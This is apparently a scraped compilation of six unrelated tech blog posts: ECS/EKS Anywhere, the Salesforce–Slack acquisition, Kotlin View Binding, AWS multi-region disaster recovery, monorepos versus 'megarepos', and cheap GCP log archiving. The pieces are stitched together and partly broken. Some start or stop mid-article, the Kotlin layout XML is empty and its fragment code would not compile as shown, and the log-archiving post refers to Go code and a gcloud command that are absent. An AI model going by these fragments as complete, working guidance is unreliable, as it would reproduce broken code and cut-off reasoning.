<p>Releasing ECS Anywhere, EKS Anywhere and EKS-D is a big deal. For the first time, you can get started with these trusted and proven container orchestration layers without paying for AWS instances, and at whatever location you prefer (including Google Cloud, Azure or any other public cloud provider). But why, you might ask, would you want to?</p>
<p>The answer lies in use cases where customers already have their own hardware in data centers or office locations. Most companies aren’t “born in the cloud”. They have existed for years or decennia, and have invested large sums of money in their IT infrastructure. Actually, they still are investing in their on-premises IT infrastructure, as this slide from Andy Jassy’s keynote shows:</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/5cm0AjrbdFgIxvEI6gJtoJ/b9fdf70784d8ed617a0b8c7a9ef2215c/early-days.jpg?fit=scale&amp;w=920" alt="Early Days"></p>
<p>These companies are reluctant to just throw away this enormous capital investment and switch over to a public cloud operational expense model. Running ECS or EKS on their own hardware offers the following benefits:</p>
<p><strong>1. Increased integration</strong><br>
With ECS or EKS in your own data center, you can run exactly the same platform locally as in an AWS region. ECS is famous for its tight integration with services like IAM. With ECS and EKS Anywhere you can benefit from this tight integration on your existing hardware. This also increases portability of workloads between your own data center and AWS.</p>
<p><strong>2. Lower cost</strong><br>
As we saw earlier with Outposts, purchasing hardware to run AWS locally is very expensive. However, if you can use your existing hardware, the cost of running a workload locally can actually be lower than it running in the cloud.</p>
<p><strong>3. Lower latency</strong><br>
The recurring theme in this article is low latency. If you want the highest performance and the quickest responses from your applications, you will need to run it as closely to the end user as possible. With ECS and EKS Anywhere you can use your existing close-to-the-user hardware for workloads that are tightly integrated with AWS.</p>
<p><strong>So what’s in it for AWS?</strong><br>
With all these benefits, it seems like AWS is cannibalizing their own product. After all, why would you pay for EC2 instances (on which AWS is making healthy margins) if you can use your own hardware? But let’s turn this argument around: if you already have your own hardware, you might not move to the cloud at all. When a company doesn’t move to the cloud, AWS literally has zero revenue from it. By providing ECS and EKS control planes for free, it can act as a gateway into many other services, like S3, DynamoDB, RDS, and so on. And once you get a taste for it…</p>
<h3>Conclusion</h3>
<p>With Outposts, Local Zones, Wavelength, EKS Anywhere, ECS Anywhere and EKS-D, Amazon is spilling their services out like oil. Obviously, other cloud providers are working extremely hard to catch up with AWS, and while they still maintain a healthy lead AWS has to keep reinventing their business model. It’s good to see that they dare to take some risk by releasing some of their big money makers for free. I wouldn’t be surprised if Amazon would drop the cost for EKS completely, sometime soon. After all, Azure AKS and Google Anthos are already free.</p>

<p><em>“Combining Slack with Salesforce Customer 360 will be transformative for customers and the industry. The combination will create <strong>the operating system for the new way to work</strong>, uniquely enabling companies to grow and succeed in the all-digital world.”</em> (<a href="https://investor.salesforce.com/press-releases/press-release-details/2020/Salesforce-Signs-Definitive-Agreement-to-Acquire-Slack/default.aspx">link</a> – has the “operating system for x” analogy/strategy ever worked?)</p>



<p><em>“We’re going to help them to <strong>just</strong> <strong>redefine the entire industry</strong>,” Benioff said of Slack during a conference call with analysts. “When the moment and the opportunity arises, you have to look and ask yourself, are you strong? Can you do something like this? Or are you weak? Or is it a moment where you just don’t have the swagger?”</em> (<a href="https://finance.yahoo.com/news/salesforce-benioff-escalates-microsoft-rivalry-050100329.html">link</a> – too little swagger likely the least of their problems…)</p>



<p><em>“What this is all about is <strong>the value of the social enterprise</strong>,” Benioff said on a call with analysts after the announcement, “And creating this incredible idea that you have <strong>this amazing hub of productivity, of collaboration and integration and applications</strong> <strong>that now leverage all this amazing data</strong>.”</em> (<a href="https://www.businessinsider.com/salesforce-marc-benioff-acquiring-slack-brings-collaboration-vision-to-life-2020-12">link</a> – “x but for the enterprise” has a decidedly mixed record, but we’re long past the window when copying and pasting “social” into the enterprise might have seemed like an unequivocally positive thing)</p>



<p><em>“<strong>This moment is one we will remember a couple decades from now</strong>,” Slack CEO Stewart Butterfield said Wednesday during an appearance at Salesforce’s annual user conference. He <strong>likened the deal to the debut of Microsoft’s Windows 95 and the emergence of the cloud</strong>. “This is a pivotal moment and the opportunity to really transform the way that we work so we’re not relying on the physical office, so we can have a digital HQ,” Butterfield said.</em> (<a href="https://finance.yahoo.com/news/salesforce-benioff-escalates-microsoft-rivalry-050100329.html">link</a> – did he say this with a straight face?)</p>


<p>Salesforce’s announcement it is acquiring Slack was just what you’d expect from a company that spends over 46 cents of every revenue dollar on marketing:</p>


<figure><img loading="lazy" width="850" height="500" src="https://www.platformonomics.com/wp-content/uploads/2020/12/image-8.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2020/12/image-8.png 850w, https://www.platformonomics.com/wp-content/uploads/2020/12/image-8-300x176.png 300w, https://www.platformonomics.com/wp-content/uploads/2020/12/image-8-768x452.png 768w" sizes="(max-width: 850px) 100vw, 850px"></figure>



<p>If there was a Magic Quadrant for Marketing Hyperbole, Swagger and Tchotchkes, Salesforce would occupy the highest and rightmost position in the entire history of Magic Quadrants. They would just redefine the entire Magic Quadrant in amazing ways (their language is remarkably Trumpian – just need ALL CAPS and a few typos…).</p>



<p>But the extravagant rhetoric did distract from several harsh realities:</p>



<h2><strong>REALITY #1: SALESFORCE HAS BECOME A FINANCIAL ROLLUP</strong></h2>



<p>Salesforce has become a financial play that is dependent on buying revenue to keep up its growth  and thereby valuation. The incremental revenue from Tableau just rolled off, so Salesforce’s <a href="https://www.theinformation.com/articles/salesforce-pays-up-for-slack-the-informations-tech-briefing">growth rate dropped</a> in the quarter that was coincidentally reported concurrent with the acquisition announcement. And they are forecasting their <a href="https://markets.businessinsider.com/news/stocks/salesforce-q3-earnings-stock-price-slack-deal-weak-growth-guidance-2020-12-1029858085">slowest growth</a> since 2009 next quarter. Hence it is time for another deal. Timing may take precedence over price or strategic plausibility.</p>



<h2><strong>REALITY #2: THIS IS A VERY, VERY EXPENSIVE ACQUISITION</strong></h2>



<p>Salesforce is paying 33 times Slack’s TTM (trailing twelve month) revenue (as of the Dec 2 close). Salesforce itself trades below 10 times TTM revenue. Even the untethered to reality Telsa only trades at 19 times TTM revenue. They are paying a premium of over 50% relative to where Slack’s stock was trading before the deal leaked (which is spectacular for Slack shareholders). $27.7 billion is an awful lot to pay for IRC chat, without competitive video or audio, and not much of a developer platform. Wall Street, who can usually rationalize any valuation, are <a href="https://www.marketwatch.com/story/salesforce-stock-drops-as-wall-street-questions-necessity-of-slack-purchase-11606930849">questioning</a> the price (and the strategic rationale). As Salesforce’s stock <a href="https://techcrunch.com/2020/12/02/salesforce-slumps-8-5-as-its-post-slack-selloff-continues/">wilts</a> due to a lack of enthusiasm in some circles for the deal, it becomes a bigger and bigger transaction for them, making it even harder to pay off. With Salesforce’s valuation down ~$35 billion since it leaked, this deal might not get consummated (Benioff previously backed off buying Twitter when investors failed to share his enthusiasm).</p>



<p>There are many better discussions of the financial aspects of this deal, but the key point is it is priced for absolute perfection. That means, among other things, they will have to generate a lot of revenue from Slack and can’t just give it away for free to existing customers to claim victory.</p>



<h2><strong>REALITY #3: SALESFORCE HAS A TERRIBLE RECORD AT INTEGRATING ACQUIRED PRODUCTS</strong></h2>



<p>Salesforce has bought a lot of companies (<a href="https://finance.yahoo.com/news/salesforce-benioff-escalates-microsoft-rivalry-050100329.html">60+</a>), but has struggled to integrate them at the product level, or consolidate them onto a common platform. They even bought an integration product (Mulesoft), but it hasn’t helped. The glass-half-full take  is they have let their acquisitions “be” and instead focused on selling the hell out of each product (and Salesforce can sell if nothing else) versus integrating across the portfolio. But once under the Salesforce umbrella, product roadmaps evolve on geologic time.</p>



<p>Letting Slack just “be” is not an option for this deal, as the entire premise is Slack will be threaded through everything and provide a coherence across the entire Salesforce portfolio that has never existed. They even <a href="https://investor.salesforce.com/press-releases/press-release-details/2020/Salesforce-Signs-Definitive-Agreement-to-Acquire-Slack/default.aspx">see</a> it as the common thread for <strong>all</strong> other business apps:</p>



<blockquote><p>“As the new interface for Salesforce Customer 360, Slack will transform how people communicate, collaborate and take action on customer information across Salesforce as well as information from all of their other business apps and systems to be more productive, make smarter, faster decisions and create connected customer experiences.”</p></blockquote>



<p>This is a big ambition for a company that has consistently struggled to do this kind of engineering (this is a company that is in its second decade of trying to figure out how to get off Oracle). Lets call it a major risk factor. Lets call it a major potential distraction from the real prerequisite for this vision, which is a singular, underlying data platform.</p>



<p>Benioff even almost <a href="https://www.businessinsider.com/salesforce-marc-benioff-acquiring-slack-brings-collaboration-vision-to-life-2020-12">acknowledges</a> they have not had the technical wherewithal to make this supposedly long-held vision real (but expects a couple of new hires will single-handedly get it done…):</p>



<blockquote><p>“I can’t even think about how many conversations Parker [Harris] and I have had on this vision,” Benioff said, “And then to see Stewart come in with Bret and make it all real. Well, that’s just awesome.”</p></blockquote>



<p>Salesforce seems to be hoping an IRC chat company can build out a broad enterprise platform for them, because they have not been able to do it themselves.</p>



<h2><strong>REALITY #4: SALESFORCE IS NEITHER A BEAR NOR AN ALLIGATOR (MORE LIKE AMWAY)</strong></h2>



<p>There once was a <a href="https://25iq.com/2014/05/31/a-dozen-things-ive-learned-from-jim-barksdale-and-barksdaleisms/">folksy executive</a>, who was better at aphorisms than email (unfortunately, his company sold email). He said:“In a fight between a bear and an alligator, it is the terrain which determines who wins”. To this day, I’m not sure if he thought his company was the bear or the alligator (he lost regardless), but the battle for information workers is (to change metaphors mid-sentence) an away game for Salesforce. They simply don’t understand or have experience with this customer audience, and previous efforts like Chatter and Quip reinforce this.</p>



<p>Some skepticism has been <a href="https://daringfireball.net/linked/2020/11/25/slack-salesforce">expressed</a> at Salesforce’s ability to build software beyond that which you’re required to use if you want to get your commission check:</p>



<blockquote><p>“If there’s anyone who knows how to make great apps and artfully-crafted user experiences, it’s Salesforce.”</p></blockquote>



<p>More directly, as much as Salesforce wants to move beyond the back office, it takes more than desire to compete in new markets against entrenched competitors (most notably Microsoft Office).</p>



<h2><strong>REALITY #5: THE PANDEMIC TAILWIND ARGUMENT HAS A FATAL FLAW</strong></h2>



<p>Salesforce seems to say things are different this time because Slack has skills Salesforce doesn’t AND the <a href="https://investor.salesforce.com/press-releases/press-release-details/2020/Salesforce-Signs-Definitive-Agreement-to-Acquire-Slack/default.aspx">pandemic changes everything</a>:</p>



<blockquote><p>“The events of this year have greatly accelerated the move by companies and governments to an all-digital world, where work happens wherever people are—whether they’re in the office, at home or somewhere in between. They need to deliver connected experiences for their customers across every touchpoint and enable their employees to work seamlessly wherever they are.”</p></blockquote>



<p>The problem is we’ve already run this experiment. Slack is having to sell out because they “<a href="https://www.wsj.com/articles/slack-missed-out-on-the-pandemics-zoom-boom-leaving-it-vulnerable-11606478401">missed the pandemic boom</a>”/”<a href="https://www.protocol.com/newsletters/sourcecode/how-slack-lost-the-pandemic">lost the pandemic</a>”, in stark contrast to their competitors Microsoft Teams and Zoom. The outcome of a Slack-led assault on the Microsoft Office franchise is not some future hypothetical – we have already seen how this battle plays out. Beyond Teams, Slack has also lost significant ground to Discord.</p>



<p>Which at long last brings me to my actual point…</p>



<h2><strong>UNSUSTAINABILITY OF SAAS SPRAWL</strong></h2>



<p>Regardless of whether the Slackforce deal makes financial sense or can be successfully executed, it is just one (overly dramatized) episode in the unfolding consolidation of SaaS business applications.</p>



<p>On the supply side, we have too many SaaS apps, with the ocean of venture capital fueled by zero-interest rates funding ever more SaaS companies on the assumption that what worked a decade ago will continue to work a decade hence (financiers also like SaaS because it models out nicely in a spreadsheet). Most new SaaS companies are chasing ever smaller markets (the more interesting opportunity is to go after the bigger, horizontal OG SaaS companies, many of which like Salesforce have settled comfortably into a product middle age).</p>



<p>But the demand side is the real impetus for SaaS consolidation. Companies simply have too many SaaS applications and collectively it’s gotten too hard to procure, manage, and get value out of a vast archipelago of siloed SaaS applications.</p>



<p>We’ll see consolidation that leverages existing customer relationships, expands product footprints, and integrates adjacent functionality. Salesforce is a consolidator if not necessarily an integrator. Twilio, with the acquisition of Segment, has shown it intends to be a consolidator. Others are (or should be if they’re not) wrestling with the question of whether they are predators or prey. Private equity will continue to buy up software companies, but have yet to show they can …</p></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>Kotlin Synthetic was one of the coolest features when I started playing with Kotlin. In the Android Java world, to get on hold of a view, you needed to use <code>findViewById()</code> and then cast to the appropriate view type. This was one of the most repetitive and boring tasks when creating a new view/screen.</p><p>Then Kotlin and its Synthetics came around. If you had a view with id <code>hello</code>, you would write <code>hello</code> and &nbsp;you could access it. No boilerplate, no <code>findViewById</code>, not a thousand member variables in your class.</p><p>But it turns out that the concept was kind of too relaxed. They had a global namespace and there were no nullability checks. This meant that you were able to access <code>hello2</code> on screen 2, even though you were on screen 1, leading to inevitable crashes.</p><p>So a step back is probably the right balance. <a href="https://youtrack.jetbrains.com/issue/KT-42121">Kotlin Android extensions</a> (which Kotlin Synthetic is part of) are deprecated, and the recommended way to replace them is the <a href="https://developer.android.com/topic/libraries/view-binding">View Bindings</a>. This has a bit more boilerplate but offers type and nullability safety.</p><h2 id="set-up">Set up </h2><p>In the <code>Android</code> section of your <code>build.gradle</code> add this:</p><pre><code>android {
    [...]
    buildFeatures {
        viewBinding true
    }
}</code></pre><h2 id="auto-generation">Auto-generation</h2><p>Now when you do <code>Build</code> -&gt; <code>Make project</code>, for every XML file you have a corresponding binding class will be generated. For instance, for your <code>fragment_screen_1.xml</code>, the <code>FragmentScreen1Binding</code> will be created. These classes contain a member variable for every child view in the XML layout.</p><p><em>Tip:</em> You might need to do <code>File</code> -&gt; <code>Sync Project with Gradle files</code> to get Android Studio to recognize those generated classes.</p><h2 id="create-the-bindings">Create the bindings</h2><h3 id="in-fragments">In Fragments</h3><pre><code>private var binding: FragmentScreen1Binding? = null // 2.

override fun onCreateView(
    inflater: LayoutInflater,
    container: ViewGroup?,
    savedInstanceState: Bundle?
): View? {
    binding = FragmentScreen1Binding.inflate(inflater, container, false) // 1.
    return binding.root // 3.
}

override fun onDestroyView() {
    super.onDestroyView()
    binding = null // 4.
}</code></pre><ol><li>Instead of the regular <code>inflate()</code> you will use the auto-generated class to inflate your view.</li><li>This <code>binding</code> is non-null only between <code>onCreateView()</code> and <code>onDestroyView()</code>.</li><li>The root view of your <code>fragment_screen_1.xml</code> layout.</li><li>Note that Fragments outlive their views. Clean up <code>binding</code> after destroying the inflated view for avoiding any memory leaks.</li></ol><h3 id="in-activities">In Activities</h3><pre><code>private lateinit var binding: FragmentScreen1Binding

override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    binding = FragmentScreen1Binding.inflate(layoutInflater)
    setContentView(binding.root)
}</code></pre><p>Similar to the fragment without the need for clean up since the inflated view is tightly associated with the activity lifecycle.</p><h2 id="use-the-bindings">Use the bindings</h2><p>For every child view in the XML layout, there's a member variable with the same name in camel case in your <code>binding</code> variable. The views without an ID are not accessible.</p><figure><pre><code>&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"

&lt;/LinearLayout&gt;</code></pre><figcaption>fragment_screen_1.xml</figcaption></figure><figure><pre><code>binding.helloWorld.text = "Hello world!"</code></pre><figcaption>FragmentScreen1.kt</figcaption></figure><p>In case you were using Kotlin Synthetic, remove the imports for <code>kotlinx.android.synthetic.*</code> and replace them with the data bindings equivalents.</p><p>For further reading, check out the <a href="https://developer.android.com/topic/libraries/view-binding">official doc</a> (and <a href="https://developer.android.com/topic/libraries/view-binding/migration">Kotlin Synthetic migration guide</a>).

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>With the recent outage on AWS last week, there have been a lot of discussions about various architectures and how effective they would've been to combat the downtime. Since these vary a lot in cost, complexity, and tradeoffs, I want to go through a couple of them at a high level, then dive into one that was unfortunately missing from much of the conversation.</p>
<h2 id="multi-cloud">Multi-Cloud</h2>
<p>First were comments made about the value of going multi-cloud. The idea of this is to run your application in… multiple clouds.
<img src="https://www.forelse.io/multi-cloud.png" alt="Multi-Cloud">
By spreading the load across multiple providers, you are insulated in case one of them goes down. In theory, it sounds great! Surely two cloud vendors won't go down at the same time! In practice, this is horrible at the application level for a multitude of reasons:</p>
<ul>
<li>The infrastructure is different for each cloud</li>
<li>Deployments gain a magnitude of complexity</li>
<li>Bandwidth charges to go between the two are outrageous</li>
</ul>
<p>Because of this, a multi-cloud architecture would not be a feasible option for high availability (outside a select few edge cases).</p>
<h2 id="multi-region">Multi-Region</h2>
<p>Next, there were talks about multi-region. An AWS Region is a group of multiple availability zones (AZ), with each AZ being one or more discrete data centers with independent power, networking, and connectivity. Operating in a single region across multiple AZs provides high availability, but doesn't provide DR. For that, you need multiple regions. A very simplified version of a multi-region setup looks like this:
<img src="https://www.forelse.io/multi-region.png" alt="Multi-Region">
This fixes a couple of the issues of going multi-cloud:</p>
<ul>
<li>Your application will stay in the same cloud, so the infrastructure will stay the same</li>
<li>Regions are completely separated, so you get the same availability benefits!</li>
<li>Region-to-region bandwidth charges are much lower than cloud-to-cloud fees!</li>
</ul>
<p>Unfortunately, most of the comments were around <em>Active-Active</em> multi-region. That is, distributing the load across multiple regions at the same time. This adds in a lot of complexities around keeping the persistence layer in sync. This also adds complexity around deployments and has a lot of places for things to go wrong. This can lead to more self-inflicted downtime than AWS has ever caused.</p>
<h2 id="multi-region-dr">Multi-Region DR</h2>
<p>This is the one that has been largely overlooked in recent days. It is the idea that only a single region is active at a time, and a secondary region is capable of taking over in the event of a disaster (hence DR). This shares the benefits listed above. However, it is able to largely mitigate the complexities of a full Active-Active setup. Under this setup, the secondary region doesn't need to be fully built - only persistent data needs to be replicated.</p>
<p><img src="https://www.forelse.io/multi-region-dr.png" alt="Multi-Region"></p>
<p>But wait, won't it take a while to deploy the full application stack in the event of a disaster? Yes… yes it will. And this is okay! High-Availability is achieved by using multiple AZs is sufficient for most common outages. If an entire <em>region</em> has issues, like we saw last week, spending &lt;1 hour standing up a new stack from backups is still preferable to a &gt;8 hour outage. This process can be streamlined via automation, but even if it's a manual (but practiced) operation, the fact that you <em>actually have options</em> is important.</p>
<p>So let's dive into this a little more to explore what it looks like:</p>
<ul>
<li>Application is deployed as usual in the primary region</li>
<li>Using AWS managed services, backups and replication for persistent data is generally a configuration setting or two away:
<ul>
<li>Add a read replica to RDS in a different region</li>
<li>Create a Dynamo DB global table</li>
<li>Enable S3 bucket replication</li>
</ul>
</li>
<li>In the event of a fail-over, deploy the application in the other region (hopefully using Infrastructure-as-Code) and update DNS settings
<ul>
<li>This process should be regularly tested</li>
</ul>
</li>
</ul>
<p>Is this a silver-bullet? Absolutely not. It won't work for every workload, and definitely won't work for every type of outage. However, it is a relatively simple solution that can also be cost effective. And last week, it could've allowed clients to be back up and functioning long before services in us-east-1 were fully restored.</p>
<h2 id="summary">Summary</h2>
<p>In conclusion, outages happen. This does not diminish the value of AWS in any way, but it does make clear the importance of good architecture and planning. There are some very expensive and elaborate systems that can be designed to mitigate these outages, but which are overkill and impractical for most clients. Fortunately, there are other options that may offer an “effective enough” solution with reasonable tradeoffs, which should become “best-practice” when working in AWS.</p>

                    <p>Breaking up a monolith can be a daunting task. Oftentimes a monolith gets broken up into many repos, and sometimes into a monorepo.</p><p>But, here's the problem I have with the term monorepoo.</p><blockquote>Monorepos are NOT monoliths!</blockquote><p>I recently heard a talk by Marcel Cutts called... <a href="https://www.youtube.com/watch?v=rdeBtjBNcDI&amp;amp=&amp;feature=youtu.be">MonoRepos for the Masses</a>. It's a great talk about the history of monorepos and big companies using them. I LOVED that talk. Definitely give it a listen. </p><p> Mono, obviously is a word that comes from latin which means, "one". The fact that the word "mono" is used in both monorepo, and monlith, tends to lend itself to a lot of confusion. </p><h2 id="monolith">MonoLITH</h2><p>First, off, monolith in an of itself might not be a bad thing for your company/team. There are a lot of companies, particularly startups, that have done great things with monoliths. In fact, Martin Fowler notes that most microservice architectures that started as microservice vs starting as a monolith and getting broken up, tend to result in bad architectures.</p><figure><a href="https://martinfowler.com/bliki/MonolithFirst.html"><div><p>bliki: MonolithFirst</p><p>Going directly to a microservices architecture is risky, so consider building a monolithic system first. Split to microservices when, and if, you need it.</p><p><span>martinfowler.com</span></p></div><p><img src="https://martinfowler.com/bliki/images/microservice-verdict/path.png"></p></a></figure><p>However, I think the drawback starts to happen when you get to a point where hundreds of folks are constantly working and committing code into it. You can very easily end up with the [Big Ball of Mud](<a href="https://exceptionnotfound.net/big-ball-of-mud-the-daily-software-anti-pattern/">https://exceptionnotfound.net/big-ball-of-mud-the-daily-software-anti-pattern/</a>) anti-pattern. A monolith can be come a castle housing your most precious of code; an impenetrable fortress surrounded by a crocodile filled moat of unforgiving technical debt.</p><p>If you're not careful, very tight coupling between different parts of the monolith can make it impossible to ship one part of the application without shipping the whole thing, and make it very difficult to refactor into smaller pieces as well.</p><h2 id="monorepo">MonoREPO</h2><p>Here's where things get interesting. So, yes, the word "mono" exists in both places, but that's not to say that they do and serve the same exact purpose. There are a lot great reasons to keep all of your code in a single repository, just like you would in a monolith.</p><p>The distinction however though is that, unlike a monoLITH, a monoREPO is <em>usually</em> just a lot of packages sharing the same code base. Some of these packages are dependent on other packages sure, but in no way does the monorepo have to ship all at once as is the case with a monolith. Nor does it mean that the repo is a big ball of mud with muddied concerns, and tight coupling.</p><p>It's for the above reasons that the term monorepo should be replaced by "megarepo". </p><h2 id="s-mono-mega-">s/mono/mega/</h2><figure><blockquote><p lang="en" dir="ltr">I propose we call them "megarepos" going forward. Too many people conflate the term "monolith" with "monorepo". Let's fix it. <a href="https://twitter.com/hashtag/divops?src=hash&amp;ref_src=twsrc%5Etfw">#divops</a></p>— Jonathan Creamer (@jcreamer898) <a href="https://twitter.com/jcreamer898/status/1189887019020894208?ref_src=twsrc%5Etfw">October 31, 2019</a></blockquote>

</figure><p>The mono/mega repo should be defined as...</p><blockquote>A bunch of packages in once place with shared tooling to facilitate collaboration, increase productivity, and create a single culture.</blockquote><p>A few highlights from using a megarepo are:</p><ul><li>Consistent build tooling</li><li>Less context switching</li><li>Much MUCH easier to update shared code</li><li>Easier to affect change across the platform</li><li>Code reviews are centralized<br></li></ul><p>In the wonderful world of a megarepo, you can in fact see the forest for the trees. Meaning, you get a sense of what all is available to you as a member of a larger organization. If the packages in your megarepo have tooling which enables them to be easily tested, shared, and used as isolated units, you end up in a world where your application itself is the component library. Disparate packages which, in a multirepo setup, might become difficult to discover are easy to find and work with as they are written, tested, and documented all in the same place.</p><p>The megarepo often has a group of shared dependencies as well. In the case of a frontend project with a React toolchain, the base level React version might be shared across packages, or there maybe shared components which have a shared version across packages. This is not a drawback of a mega, it's a plus! Now you get to live in a world where an update to a shared package can all at once have every single dependent package run a test suite to verify that it didn't break. This makes it so much easier to maintain consistency across your entire application.</p><p>Nothing is without its negative sides of course. There is no such thing as a silver bullet, and in no way is a megarepo the right thing for every team, in every situation. Just like any tool, it should be thought out extensively before put into practice. One of the biggest obstacles in working this way is, it requires a good deal more tooling to work with. So, if you're at a company where there's no team managing the platform of the megarepo itself, it can be a difficult task to maintain it.</p><p>That being said, when you do have a team dedicated to writing tools for the megarepo, it can be a fantastic option, and I have to give credit to <a href="https://twitter.com/benmvp">Ben Ilegbodu</a>, and <em>maybe</em> <a href="https://twitter.com/kylewelch">Kyle Welch</a> for helping me come up with the term.</p><figure><blockquote><div lang="en" dir="ltr"><p>I'll give you microapps but megarepos was me.

</figure><h2 id="conclusion">Conclusion</h2><p>A move away from the word monorepo will hopefully convey the fact that even though code might share the same repo, it is not in any way, a monolith.</p><p>I love the idea of creating a single culture, it was a great take away from Marcell's talk.</p><p>So, how about going forward, rather than talking about monorepos, we talk about megarepos, and how much benefit they can bring to a large team.</p><h2 id="-todo-write-a-post-about-how-to-implement-one">// TODO: write a post about how to implement one</h2><figure><a href="https://github.com/jcreamer898/blog-post-ideas/issues/1"><div><p>How to successfully implement a megarepo · Issue #1 · jcreamer898/blog-post-ideas</p><p>Needs to discuss options like Bolt and Lerna.

    <div>
      <h2 id="tldr">TL;DR</h2>
<p>Compress data and use cold storage tiers to achieve absolute minimum cost for long-term logs archiving at as little as $1.20 per TB per year.</p>
<h2 id="problem">Problem</h2>
<p>Imagine you need to capture and store 1TiB of logs monthly and retain them for 10 years - what is the most cost-effective way of doing so (infrastructure cost and long-term maintenance overheads)? Google Cloud produces a lot of audit logging and it is stored in Cloud Logging for free. They give you generous <a href="https://cloud.google.com/logging/docs/audit#audit_log_retention">400 days retention for Admin Activity and System Event logging and 30 days for Data Access</a>. As of recently, they also support <a href="https://cloud.google.com/logging/docs/storage#custom-retention">Custom retention</a> which allows you to store logs upwards 10 years at a charge of $0.01 per GiB  per month (from March 31, 2021).
However, pricing stops being favourable when you ingest and retain regular, non-audit logs. Beyond the first 50GiB per project, the charge is <a href="https://cloud.google.com/stackdriver/pricing">hefty $0.50/GiB</a>. We can use Cloud Logging <a href="https://cloud.google.com/logging/docs/export#sink-terms">export sinks</a> to route logs directly into GCS, bypassing Cloud Logging’s $0.50 charge. GCS pricing can be found <a href="https://cloud.google.com/storage/pricing#storage-pricing">here</a> where standard storage is twice as expensive as Cloud Logging retention, however, Coldline or colder storage classes provide price parity or even considerable savings.</p>
<h2 id="solution">Solution</h2>
<p>We want to export logs directly into GCS, bypassing Cloud Logging fee. We also hypothesise that it will be cheaper to incur some cost of compressing the data before long-term storage vs storing uncompressed.</p>
<h3 id="export-all-the-logs">Export all the logs!</h3>
<p>First of all, we need to configure Cloud Logging to export all the logs into logging sink of our choice. This is easy when you have a project or two, but what can you do when you have hundreds of projects? [Aggregated sinks] feature to the rescue! It allows us to have an organization-wide logging rules (be careful, this can generate massive amounts of logs).</p>
<p>Here is an example of Aggregated sink configured using Terraform to export all Audit logs into a single bucket.</p>
<div><pre><code data-lang="hcl"><span>resource</span> <span>"google_logging_organization_sink" "audit-logging-sink"</span> {
  name   <span>=</span> <span>"org-audit-logging"</span>
  org_id <span>=</span> <span>var</span>.<span>org_id</span><span>
</span><span>
</span><span>  # apply to the entire org
</span><span></span>  include_children <span>=</span> <span>true</span><span>
</span><span>
</span><span>  # Can export to pubsub, cloud storage, or bigquery
</span><span></span>  destination <span>=</span> <span>"storage.googleapis.com/${google_storage_bucket.bucket-audit-logging.name}"</span><span>
</span><span>
</span><span>  # Log all AuditLogs
</span><span></span>  filter <span>=</span> "protoPayload.\"@type\"<span>=</span><span>type</span>.<span>googleapis</span>.<span>com</span><span>/</span><span>google</span>.<span>cloud</span>.<span>audit</span>.<span>AuditLog</span><span>"</span>
}
</code></pre></div><h3 id="compress-all-the-logs">Compress all the logs!</h3>
<p>With our hypothetical 1TiB logging ingest we can try and save on storage costs by compressing logs first. Logs are usually great candidates for compression due to being plaintext and having a lot of repeating tokens. So imagine that all aggregated logs are arriving in <code>all-logs-export</code> bucket. There is a number of options on how we can achieve compression here:</p>
<ul>
<li>Run 24/7 GCE instance which is subscribed to bucket’s <a href="https://cloud.google.com/storage/docs/pubsub-notifications">PubSub events</a>. Running anything 24/7 sounds expensive and will fail us on our mission of finding the cheapest approach here. It also means a level of a maintenance overhead for the GCE, which is not something that will get reflected in bills, but rather in payroll.</li>
<li>Run nightly batch processing using GCE and <a href="https://cloud.google.com/compute/docs/instances/preemptible">preemptible VM instances</a>. This is likely the absolute best solution in terms of cost per GiB logs compressed. We are only running VMs for short-bursts and VMs are heavily discounted. Short-lived instances are also less of maintenance overhead as each time it is launched up with a latest, patched version of the OS. However, you have to <a href="https://cloud.google.com/scheduler">build a trigger</a> to run this nightly, deal with corrupted compression due to the preemptions, scale system if logging suddenly goes x10 or x100.</li>
<li>Trigger Google Cloud Function each time the object has finished writing into the bucket using <a href="https://cloud.google.com/functions/docs/calling/storage">Google Cloud Storage Triggers</a>. Compress file and store it in a <code>all-logs-export-compressed</code> bucket. This is definitely a winner in terms of low maintenance, but how much would it cost? Let’s find out.</li>
</ul>
<h2 id="cloud-functions-implementation">Cloud Functions implementation</h2>
<p>It is worth to be well aware of Cloud Functions limitations:</p>
<ul>
<li><a href="https://cloud.google.com/functions/quotas#time_limits">Max execution time is 9min</a></li>
<li><a href="https://cloud.google.com/functions/quotas#resource_limits">Max function memory of 2048MB</a></li>
<li><a href="https://cloud.google.com/functions/docs/concepts/exec#file_system">Local data is written to an in-memory volume</a></li>
<li><a href="https://cloud.google.com/functions/pricing#compute_time">Compute time is proportional to a memory allocated to the function</a></li>
<li>Bonus - Cloud Logging export does generate files in excess of 2GiB.</li>
</ul>
<h3 id="great-what-does-it-all-mean">Great, what does it all mean?</h3>
<p>It means that Cloud Functions resources are finite and we can not get away with inefficient implementation. Our function must not store files in local storage, because it is backed up by Function’s memory, meaning that we will not have enough memory to store larger log files. Additionally, we must be able to download, compress and upload files larger than 2GiB in less than 9 minutes otherwise our function will stop.</p>
<h3 id="how-can-we-avoid-hitting-the-above-limitations">How can we avoid hitting the above limitations?</h3>
<p><strong>Streaming.</strong> Instead of reading the entire file into memory at once, we are going to incrementally stream download, compress and stream upload the results. This will keep memory usage low, allowing 2048MB function to process files of any size, mainly limited by 9-minute execution limit.</p>
<p>We will write this function in Go to keep its memory usage low, Go also makes the implementation of streaming compression a breeze. We will use <a href="https://pkg.go.dev/cloud.google.com/go/storage">cloud.google.com/go/storage</a> and <a href="https://golang.org/pkg/compress/gzip/">compress/gzip</a> packages in our implementation.</p>

<p><a href="https://cloud.google.com/sdk/gcloud/reference/functions/deploy">By default</a>, Cloud Functions are deployed with 256MB of memory, meaning it only has 400Mhz of CPU available to it. GZIPing of large files 1GB+ seems to require more grunt to be able to complete compression within 9-minute slot. The solution is simple, deploy Cloud Function with more memory. While extra memory will go to waste, we will prevent timeouts by completing compression sooner.</p>
<p>I’ve added <code>--memory=1024'</code> parameter to the gcloud command above to effectively x4 available CPU. Now, even the largest files (around 3GB) finish processing in under 3 minutes. I did not use <code>--memory=2048'</code> as it would increase memory waste and be less efficient on smaller sized logs. However, if I’ll notice that processing slows down towards 5 minutes mark, I’ll double memory again.</p>

